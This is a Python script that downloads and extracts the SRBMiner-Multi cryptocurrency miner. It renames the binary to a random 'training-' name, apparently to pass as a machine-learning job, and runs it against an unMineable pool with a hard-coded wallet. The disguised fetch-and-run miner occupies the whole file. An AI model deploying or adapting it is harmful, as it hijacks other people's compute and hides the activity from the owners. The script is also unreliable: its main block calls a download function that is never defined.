import subprocess
import secrets
import shutil
import os
from pathlib import Path

# Constants
VERSION = "2.7.2"
WORK_DIR = Path.home() / "work"
SRBMiner_DIR = WORK_DIR / f"SRBMiner-Multi-{VERSION}"
POOL = "stratum+ssl://ghostrider.unmineable.com:443"
USERNAME = "LTC:LTHZzHREhbJkP8vDyUCxqvz1yReBqEC2q8.CPU-GhostRider-Multi#mo4y-tkdg"
ALGO = "ghostrider"
#DONATE = "1"
def create_work_dir():
    WORK_DIR.mkdir(parents=True, exist_ok=True)

    url = f"https://github.com/doktor83/SRBMiner-Multi/releases/download/v{VERSION}/SRBMiner-Multi-{VERSION}-Linux.tar.gz"
    try:
        subprocess.run(["wget", url, "-P", str(WORK_DIR)], shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error downloading SRBMiner: {e}")
        return False
    return True

def extract_SRBMiner():
    try:
        subprocess.run(["tar", "-xvzf", str(WORK_DIR / f"SRBMiner-Multi-{VERSION}-Linux.tar.gz"), "-C", str(WORK_DIR)], shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error extracting SRBMiner: {e}")
        return False
    return True

def rename_SRBMiner():
    SRBMiner_path = SRBMiner_DIR / "SRBMiner"
    random_name = f"training-{secrets.randbelow(375)}-{secrets.randbelow(259)}"
    shutil.move(str(SRBMiner_path), str(WORK_DIR / random_name))
    return WORK_DIR / random_name

def set_permissions(SRBMiner_path):
    os.chmod(str(SRBMiner_path), 0o755)

def run_SRBMiner(SRBMiner_path):
    SRBMiner_cmd = [
        str(SRBMiner_path),
        "-o", POOL,
        "-u", USERNAME,
        "-a", ALGO,
        "-k", "--tls"
    ]
    try:
        subprocess.run(SRBMiner_cmd, shell=False, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running SRBMiner: {e}")

if __name__ == "__main__":
    create_work_dir()
    if download_SRBMiner() and extract_SRBMiner():
        SRBMiner_path = rename_SRBMiner()
        set_permissions(SRBMiner_path)
        run_SRBMiner(SRBMiner_path)
